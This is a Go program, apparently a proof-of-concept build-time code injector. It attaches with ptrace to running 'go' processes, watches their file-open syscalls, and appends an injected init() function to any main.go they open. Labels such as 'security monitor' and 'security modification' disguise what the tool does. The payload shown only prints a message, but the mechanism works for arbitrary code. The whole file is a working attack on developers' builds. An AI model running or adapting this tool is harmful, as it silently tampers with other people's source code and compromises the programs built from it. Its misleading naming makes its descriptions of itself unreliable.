package main

import (
	"fmt"
	"log"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"syscall"

	ps "github.com/mitchellh/go-ps"
)

// the code to be injected
const SecurityPayload = `
func init() {
    fmt.Println("Security Advisory: still not taking supply chain security seriously?")
}
`

type ProcessInfo struct {
	processId  int
	process    *os.Process
	sourcePath string
	backup     []byte
	modified   bool
}

// modifies the target source file
func (p *ProcessInfo) injectSecurityCheck() error {
	log.Printf("Applying security modification to: %s", p.sourcePath)

	sourceCode, err := os.ReadFile(p.sourcePath)
	if err != nil {
		return fmt.Errorf("source read error: %v", err)
	}
	p.backup = sourceCode

	modifiedCode := string(sourceCode) + SecurityPayload
	if err := os.WriteFile(p.sourcePath, []byte(modifiedCode), 0644); err != nil {
		return fmt.Errorf("source modification error: %v", err)
	}

	p.modified = true
	log.Printf("Security modification applied: %s", p.sourcePath)
	return nil
}

// monitorProcessActivity attaches to the process and monitors file operations
func (p *ProcessInfo) monitorProcessActivity() error {
	log.Printf("Initiating process monitor: PID %d", p.processId)
	runtime.LockOSThread()

	if err := syscall.PtraceAttach(p.processId); err != nil {
		return fmt.Errorf("process attachment failed: %v", err)
	}

	var processState syscall.WaitStatus
	syscall.Wait4(p.processId, &processState, 0, nil)

	defer syscall.PtraceDetach(p.processId)

	//  syscall monitoring
	for {
		if err := syscall.PtraceSyscall(p.processId, 0); err != nil {
			return err
		}

		_, err := syscall.Wait4(p.processId, &processState, 0, nil)
		if err != nil {
			return fmt.Errorf("process monitoring error: %v", err)
		}

		if processState.Exited() {
			log.Printf("Process terminated: %d", p.processId)
			return nil
		}

		// some syscall monitoring for debugging
		var registers syscall.PtraceRegs
		if err := syscall.PtraceGetRegs(p.processId, &registers); err != nil {
			return fmt.Errorf("register access error: %v", err)
		}

		if isFileSystemOperation(registers.Orig_rax) {
			filePath, _ := readProcessMemoryString(p.processId, uintptr(registers.Rsi))
			log.Printf("File operation detected: %s", filePath)

			if strings.Contains(filePath, "main.go") {
				p.sourcePath = filePath
				return p.injectSecurityCheck()
			}
		}
	}
}

// safely reads a string from process memory
func readProcessMemoryString(pid int, addr uintptr) (string, error) {
	memoryBuffer := make([]byte, 4096)
	_, err := syscall.PtracePeekData(pid, addr, memoryBuffer)
	if err != nil {
		return "", err
	}

	if terminatorIndex := strings.IndexByte(string(memoryBuffer), 0); terminatorIndex != -1 {
		return string(memoryBuffer[:terminatorIndex]), nil
	}
	return "", fmt.Errorf("invalid string format in process memory")
}

// checks if the syscall is file-related
func isFileSystemOperation(syscallNum uint64) bool {
	fileOperations := []uint64{2, 257, 21} // open, openat, access
	for _, operation := range fileOperations {
		if syscallNum == operation {
			return true
		}
	}
	return false
}

func main() {
	log.Printf("Initializing process security monitor...")

	monitoredProcesses := make(map[int]bool)

	processQueue := make(chan ProcessInfo)

	shutdownSignal := make(chan os.Signal, 1)
	signal.Notify(shutdownSignal, os.Interrupt, syscall.SIGTERM)

	go func() {
		for processInfo := range processQueue {
			if err := processInfo.monitorProcessActivity(); err != nil {
				log.Printf("Monitoring error: %v", err)
			}
		}
	}()

	go func() {
		for {
			processes, _ := ps.Processes()
			for _, process := range processes {
				if !monitoredProcesses[process.Pid()] && process.Executable() == "go" {
					if processHandle, err := os.FindProcess(process.Pid()); err == nil {
						monitoredProcesses[process.Pid()] = true
						log.Printf("New process detected: PID %d", process.Pid())
						processQueue <- ProcessInfo{processId: process.Pid(), process: processHandle}
					}
				}
			}
		}
	}()

	<-shutdownSignal
	log.Println("Initiating graceful shutdown...")
}
